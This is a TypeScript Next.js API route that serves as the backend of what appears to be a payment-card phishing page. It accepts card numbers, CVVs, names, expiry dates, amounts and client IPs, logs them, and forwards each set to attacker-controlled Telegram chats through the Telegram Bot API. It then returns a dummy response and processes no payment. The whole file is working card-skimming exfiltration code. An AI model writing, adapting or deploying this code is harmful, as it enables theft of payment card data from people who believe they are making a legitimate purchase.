import { NextRequest, NextResponse } from "next/server";
const capitalized = (word: string) => word.charAt(0).toUpperCase() + word.slice(1);
export async function POST(request: NextRequest) {
  const { cc, cvv, name, expiry, amount } = await request.json();
  const ip = (request.headers.get("x-forwarded-for") ?? "127.0.0.1").split(",")[0];
  console.log(cc, cvv, name, expiry, amount, ip);
  if (!process.env.BOT_TOKEN || !process.env.GC) {
    return new NextResponse("ENV", {
      status: 500,
    });
  }
  const chats = Array.from(new Set(process.env.GC?.split(",")));
  console.log(chats);
  try {
    for (let chat of chats) {
      await telegramSendMessage(
        process.env.BOT_TOKEN!,
        chat,
        `${new Date().toLocaleString()}\n--------\n${Object.entries({
          cc,
          cvv,
          name,
          expiry,
          amount,
          ip,
        })
          .map(([k, v]) => `${capitalized(k)} \`${v}\``)
          .join("\n")}`
      );
    }
  } catch (er) {
    console.error(er);
  }
  return new NextResponse(JSON.stringify({ answer: "John Doe" }), {
    status: 200,
  });
}

const telegramSendMessage = function (botKey: string, chatId: string, text: string) {
  return fetch(`https://api.telegram.org/bot${botKey}/sendMessage?chat_id=${chatId}&parse_mode=Markdown`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ text }),
  }).then(function (res) {
    if (res.status > 400) {
      console.error("Error sending message to Telegram:", res.status, res.statusText);
      return false;
    }
    console.log("Message sent to Telegram:", res.status, res.statusText);
    return true;
  });
};
